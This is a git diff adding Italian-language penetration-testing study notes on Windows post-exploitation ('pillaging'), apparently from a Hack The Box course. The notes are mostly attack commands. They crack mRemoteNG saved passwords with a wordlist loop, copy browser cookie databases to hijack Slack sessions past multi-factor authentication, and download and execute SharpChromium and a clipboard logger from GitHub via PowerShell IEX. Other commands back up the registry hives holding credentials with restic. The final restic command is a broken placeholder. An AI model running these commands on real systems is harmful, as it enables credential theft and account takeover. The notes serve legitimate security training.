@@ -1363,3 +1363,122 @@ $lnk.Description = "Browsing to the directory where this file is saved will trig
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
+
+
+# Pillaging
+
+Il pillaging e' il processo di ottenere informazioni da un sistema compromesso.
+Informazioni tipo personal info, corporate blueprints, credit card data, info sul server etc.e5c.
+
+## Data Sources
+
+- Installed Applications
+- Installed Services (sito web, file share, databse, name server, certificati, source code server, virtualization, backup, logging systems)
+- Sensitive Data (Keylogging, Screen Capture, Network traffic capture, Previous audit reports)
+- User information (history files, roles and privileges, web browser, IM clients)
+
+## Installed Applications
+`C:\>dir "C:\Program Files"`
+### Installed programs Via Powershell and Reg key
+```
+PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+```
+
+Se ad esempio vediamo **mRemoteNG** e' un servizio che salva credenziali in un file **confCons.xml** e usa una password hardcodata **mR3m**.
+**python script per decriptare le password**: https://github.com/haseebT/mRemoteNG-Decrypt
+
+### For loop per crackare le PW
+`[!bash!]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    `
+
+
+## Abusing Cookied to get access to IM Clients
+Applicazioni di IM(Instant Messaging) come Slack o Microsoft Teams sono diventate fisse negli uffici moderni.
+
+Se l'utente sta usando qualche Multi-Facotr authentication o non riusciamo a prendere le credenziali in plaintext possiamo rubare i cookie per loggare nel cloud-based client.
+
+Spesso ci sono tool per fare questo
+
+### Cookie Extraction from Firefox
+Firefox saves the cookies in an SQLite database in a file named cookies.sqlite. This file is in each user's APPDATA directory %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.
+
+### Copy Firefox Cookies Database
+`PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
+
+poi usiamo questo script (https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) per estrarre i cookie dal DB.
+
+### Extract slack cookied from firefox COokie DB
+`j4k1dibe@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d`
+
+il cookie si chiama **d**
+
+Dopo che abbiamo il cookie possiamo usare estensioni tipo **Cookie-editor** per modificare 
+
+### Powershell script to Invoke-SharpChromium ed estrarre cookie da chromium based browsers
+
+Anche in chromium i cookie stanno in un SQLite database ma il valore del cookie e' criptato con DPAPI )Data Protection API).
+Per decriptare dovremmo fare una roba dalla sessione dell' utente cmpromesso. per fortuna c'e' **SharpChromium** che fa tutto.
+
+
+```
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
+arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
+```
+
+### Copy cookies to SharpChromium Expected Location
+SharpChromium ha i path dei cookie hardcodati quindi se non corrisponde dovremmo mettere il cookie nel path che si aspetta.
+
+`PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"`
+
+### Invoke sharpchromium cookies extraction
+
+`PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"`
+
+
+## Clipboard
+
+### Monitoring the clipboard with PowerShell
+```
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+PS C:\htb> Invoke-ClipboardLogger
+```
+
+## Roles and Services.
+tipici ruoli dei server sono:
+
+- File and Print Servers
+- Web and Database Servers
+- Certificate Authority Servers
+- Source Code Management Servers
+- Backup Servers
+
+### Attacking Backup servers
+
+tipicamente i sistemi di backup hanno bisogno di un account per connettersi alla target machine e fare il backup.
+
+Dovremmo cercare informazioni che ci aiutano a muovere lateralmente nella rete o escalare i privilegi.
+
+Per esempio **Restic**.
+
+### Restic, initialize backup directory
+
+`PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init`
+
+### Restic- backup a directory
+
+```
+PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
+PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
+```
+
+### Resti-backup a directory with VSS
+
+`PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot`
+
+### Resti-check backups saved in a repository
+`PS C:\htb> restic.exe -r E:\restic2\ snapshots`
+
+### Restic- restore a backup with ID
+`restic - Restore a Backup with ID`
